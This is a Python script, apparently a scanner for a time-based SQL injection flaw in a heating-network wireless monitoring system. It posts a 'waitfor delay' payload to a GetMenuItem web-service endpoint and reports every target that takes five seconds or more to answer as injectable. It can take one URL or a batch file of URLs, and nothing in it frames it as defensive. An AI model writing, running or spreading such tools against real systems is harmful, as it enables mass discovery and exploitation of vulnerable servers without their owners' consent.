import requests
import argparse
import time

# 检测单个URL
def K14(url):
    create_url = url+"/DataSrvs/UCCGSrv.asmx/GetMenuItem"

    data = {"name":"1') waitfor delay '0:0:5'-- +"}
    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
    ,"Content-Type":"application/x-www-form-urlencoded"
}

    try:
        start_time = time.time()
        req = requests.post(create_url, data=data, headers=headers)
        end_time = time.time()
        req_time = end_time - start_time
        if(req_time>=5):
            print("{}存在延迟注入".format(url))
        else:
            print("{}不存在延迟注入".format(url))
    except:
        print("{}不允许访问".format(url))

# 批量检测
def K14_counts(filename):
    try:
        with open(filename, 'r') as file:
            urls = file.readlines()
            for url in urls:
                url = url.strip()
                if url:
                    K14(url)
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo='''                                                      ___                
     /777          ...           ...      < - - - - -()_ \      ...      
    (o o)         (o o)         (- -)             !!   | |     (- o)     
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo------------------ooO--(_)--Ooo-

'''
    print(logo)
# 帮助信息
def main():
    parser = argparse.ArgumentParser(description="K14-2开源-热网无线监测系统-SQL")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        K14(args.u)
    elif args.f:
        K14_counts(args.f)
    else:
        parser.print_help()

if __name__ == "__main__":
    start()
    main()